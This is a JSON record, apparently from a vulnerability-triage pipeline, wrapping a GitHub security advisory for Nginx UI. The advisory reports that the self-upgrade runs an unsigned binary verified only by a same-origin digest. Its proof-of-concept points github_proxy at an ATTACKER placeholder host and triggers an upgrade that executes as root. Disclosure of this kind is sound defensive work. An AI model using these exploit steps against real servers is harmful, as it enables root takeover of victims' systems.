@@ -1,0 +1,61 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"comments\": 2, \"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/120405029?v=4\", \"events_url\": \"https://api.github.com/users/novice-22/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/novice-22/followers\", \"following_url\": \"https://api.github.com/users/novice-22/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/novice-22/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/novice-22\", \"id\": 120405029, \"login\": \"novice-22\", \"node_id\": \"U_kgDOBy08JQ\", \"organizations_url\": \"https://api.github.com/users/novice-22/orgs\", \"received_events_url\": \"https://api.github.com/users/novice-22/received_events\", \"repos_url\": \"https://api.github.com/users/novice-22/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/novice-22/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/novice-22/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/novice-22\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-107812\", \"cvss\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-494\", \"name\": \"Download of Code Without Integrity Check\"}], \"description\": \"## Summary\\nThe self-upgrade downloads the release binary and its checksum (`*.tar.gz` and `*.tar.gz.digest`)\\nthrough the SAME endpoint (`version.GetUrl()`, which is `github_proxy` or, by default, the project's\\n`cloud.nginxui.com` mirror), and verifies the binary ONLY by comparing it to that digest:\\n`digestFileContent == DigestSHA512(tarName)`. Both the binary and the digest come from the same\\norigin, and there is NO cryptographic signature / public-key verification. The downloaded binary then\\nreplaces the running executable (`selfupdate.CommitBinary`) and the process restarts, so the binary\\nruns as the nginx-ui user (typically root).\\n\\nBecause integrity rests only on a digest fetched from the same place as the binary, anyone who\\ncontrols that download path can substitute a malicious binary plus a matching digest and obtain code\\nexecution as root on the next upgrade. Additionally, the `github_proxy` setting accepts `http://`\\nURLs, so the binary+digest can be fetched over cleartext.\\n\\n## Affected code\\n- `internal/version/url.go GetUrl(path)` = `<github_proxy or cloud.nginxui.com>/<path>` — used for\\n  BOTH the binary and the digest.\\n- `internal/upgrader/upgrade.go DownloadLatestRelease`: digest URL and binary URL are both wrapped\\n  with `GetUrl()`, fetched, and checked with `digestFileContent == DigestSHA512(tarName)`. No\\n  signature verification anywhere in `internal/upgrader/`.\\n- `selfupdate.CommitBinary` then replaces the running binary; the process restarts.\\n- `settings/http.go`: `GithubProxy` accepts any URL (`binding:\\\"omitempty,url\\\"`), including `http://`.\\n\\n## Attack scenarios\\nA. Compromised mirror / CDN (primary). By default the binary+digest are routed through\\n   `cloud.nginxui.com`. If that mirror (or the GitHub release CDN) is compromised — or DNS/BGP is\\n   hijacked — it can serve a malicious binary + matching digest to EVERY instance that upgrades,\\n   yielding root RCE fleet-wide. No nginx-ui credentials are needed by the attacker (they control the\\n   mirror). A binary signature would prevent this.\\nB. HTTP proxy + on-path MITM. Operators behind GitHub-restricted networks are the intended users of\\n   `github_proxy`; the field accepts `http://`, so the binary+digest are fetched in cleartext. An\\n   attacker on the network path (rogue gateway / ARP spoofing / malicious Wi-Fi / compromised router)\\n   substitutes a malicious binary + matching digest -> root RCE on the next upgrade.\\nC. (mechanism demonstration) An authenticated user sets `github_proxy` to a server they control and\\n   triggers the upgrade. This is how the PoC below proves the mechanism; note that in nginx-ui (no\\n   role separation) such a user is admin-equivalent, so on its own this path is self-inflicted — it\\n   is included only to demonstrate that an unsigned attacker binary is accepted and executed.\\n\\n## Proof of Concept (live, official image uozi/nginx-ui:2.3.11) — mechanism\\nAn attacker HTTP server serves any `*.tar.gz` -> a malicious tarball (whose `nginx-ui` is a script\\nthat writes a marker as whoever runs it) and any `*.digest` -> the SHA-512 of that tarball.\\n1. Set the download origin to the attacker server (here via `github_proxy`; in scenarios A/B this is\\n   instead a compromised mirror / MITM): `POST /api/settings` with\\n   `http.github_proxy = http://ATTACKER:8890` -> 200. The field accepts the http URL.\\n2. Trigger the upgrade: WS `GET /api/upgrade/perform`, send `{\\\"channel\\\":\\\"stable\\\"}`.\\n3. Observed:\\n   - The attacker server received BOTH\\n     `GET /https://github.com/.../nginx-ui-linux-64.tar.gz.digest` and `.../nginx-ui-linux-64.tar.gz`\\n     (over cleartext http).\\n   - WS: \\\"Downloading latest release\\\" -> \\\"Performing core upgrade\\\" -> restart. The attacker tarball's\\n     digest matched (attacker supplied both) -> integrity check PASSED, no signature checked.\\n   - Inside the container: `/tmp/UPGRADE_PWNED` = `UPGRADE_RCE_EXECUTED uid=0` -> the malicious binary\\n     replaced nginx-ui and EXECUTED AS ROOT.\\n\\n## Impact\\nRoot code execution on upgrade. Realistically reached by compromising the trusted download source\\n(mirror/CDN, scenario A — fleet-wide) or by MITM of a cleartext http proxy (scenario B). A\\ncryptographic signature on the release binary would prevent all of these.\\n\\n## Honest scope / caveats\\n- Live-verified: the integrity-bypass MECHANISM — an unsigned binary plus a same-origin digest is\\n  accepted and executed as root, and the binary+digest are fetched over cleartext http when an http\\n  proxy is configured. This was demonstrated via scenario C (attacker-controlled proxy).\\n- NOT staged (threat-model assumptions, not PoC artifacts): actually compromising `cloud.nginxui.com`\\n  / the GitHub CDN (scenario A), and performing a real on-path MITM intercept (scenario B). These are\\n  standard attacker capabilities, marked here as analysis.\\n- The upgrade is operator-triggered (UI:R). The default flow uses HTTPS to `cloud.nginxui.com`+GitHub\\n  plus the digest, so this is not \\\"zero integrity\\\" — the gap is the absence of a signature, which\\n  matters when the source is compromised or the transport is cleartext (http proxy).\\n\\n## Suggested fix\\nVerify the release binary against a cryptographic signature with a public key pinned in the nginx-ui\\nbinary (or a digest fetched over an independent, pinned channel), not a digest from the same origin\\nas the binary. Reject `http://` for `github_proxy` (require https). Consider treating `github_proxy`\\nas a protected setting.\\n\\n## Dedup / novelty\\nDistinct from CVE-2026-42238 (unauthenticated backup-restore RCE) and CVE-2026-33026 (backup\\ntampering); this is the self-UPGRADE binary path. No existing nginx-ui CVE/GHSA covers upgrade\\nintegrity (checked osv.dev and the GitHub advisory database). Appears novel.\", \"ghsa_id\": \"GHSA-662p-52hx-cmh2\", \"github_reviewed_at\": \"2026-10-09T17:08:21Z\", \"html_url\": \"https://github.com/advisories/GHSA-662p-52hx-cmh2\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-662p-52hx-cmh2\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-107812\"}], \"nvd_published_at\": null, \"published_at\": \"2026-10-09T17:08:21Z\", \"references\": [\"https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-662p-52hx-cmh2\", \"https://github.com/0xJacky/nginx-ui/commit/580585516dd87a8b176bcdac258db70c3b64b7ec\", \"https://github.com/0xJacky/nginx-ui/releases/tag/v2.5.0\", \"https://github.com/advisories/GHSA-662p-52hx-cmh2\"], \"repository_advisory_url\": \"https://api.github.com/repos/0xJacky/nginx-ui/security-advisories/GHSA-662p-52hx-cmh2\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/0xJacky/nginx-ui\", \"summary\": \"Nginx UI: Self-upgrade runs an unsigned binary verified only by a same-origin digest → RCE via a compromised mirror or MITM\", \"type\": \"reviewed\", \"updated_at\": \"2026-10-09T17:08:21Z\", \"url\": \"https://api.github.com/advisories/GHSA-662p-52hx-cmh2\", \"vulnerabilities\": [{\"first_patched_version\": \"1.9.10-0.20260728114330-580585516dd8\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/0xJacky/Nginx-UI\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 1.9.10-0.20250517140552-daee3ac7ade1, < 1.9.10-0.20260728114330-580585516dd8\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-662p-52hx-cmh2",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/0xJacky/Nginx-UI: >= 1.9.10-0.20250517140552-daee3ac7ade1, < 1.9.10-0.20260728114330-580585516dd8"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-107812",
+      "CVE-2026-33026",
+      "CVE-2026-42238"
+    ],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/0xJacky/Nginx-UI"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-10-09T19:14:15.282301Z",
+  "provenance": {
+    "content_sha256": "f9fdd14cb82466dfa4915d727740f901eb6b4f48c5bf12634b34900228c522b4",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-10-09T17:08:21Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-662p-52hx-cmh2",
+  "status": "active",
+  "title": "Nginx UI: Self-upgrade runs an unsigned binary verified only by a same-origin digest → RCE via a compromised mirror or MITM",
+  "updated_at": "2026-10-09T17:08:21Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-662p-52hx-cmh2"
+}
